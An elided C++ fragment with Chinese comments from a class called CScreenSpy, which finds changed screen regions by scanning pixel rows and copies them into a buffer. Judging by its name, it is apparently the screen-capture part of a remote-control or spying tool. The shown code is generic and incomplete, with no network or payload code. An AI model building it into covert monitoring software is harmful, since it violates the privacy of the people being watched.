...
CScreenSpy::CScreenSpy(int nbiBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	...
	m_byAlgorithm	= ALGORITHM_SCAN; // 默认使用隔行扫描算法
	...
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;//每行图片数据的字节数
...
bool CScreenSpy::ScanChangedRect(int nStartLine)
{
	...
	// 0 是最后一行
	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine)); //*p1 原来的一行数据
	p2 = (PDWORD)m_lpvLineBits;
	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);

	for (int j = 0; j < m_nFullWidth; j += m_nIncSize) // m_nIncSize 意思是 每次往后移动几个像素，比如如果是8位色，就是1个像素1个字节表示，每次我们比较 就相当于比较了4个像素的内容，如果是16位 就相当于比较2个像素的值，所以构造函数会用32除位数
	{
		if (*p1 != *p2)
		{
...
//把lprect指定的区域写到m_rectBuffer 同时更新m_lpbmi_full
void CScreenSpy::CopyRect( LPRECT lpRect )
{
	...
	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);//跟新m_lpbmi_full
	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));//写位置
